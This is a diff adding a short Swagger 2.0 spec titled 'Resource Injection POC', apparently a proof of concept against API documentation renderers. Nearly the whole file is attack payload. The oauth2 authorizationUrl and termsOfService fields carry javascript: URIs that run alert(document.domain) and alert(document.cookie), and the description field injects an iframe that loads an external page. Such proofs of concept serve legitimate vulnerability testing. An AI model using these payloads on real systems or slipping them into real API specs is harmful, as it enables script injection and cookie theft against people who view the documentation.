@@ -1,0 +1,16 @@
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
+info:
+  version: "0.0.1"
+  title: Resource Injection POC
+  description: <iframe id="frame" src="https://www.youtube.com/watch?v=p5L_s_5zpsQ" width="100%" height="100%"></iframe>
+  termsOfService: "javascript:alert(document.cookie)"
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
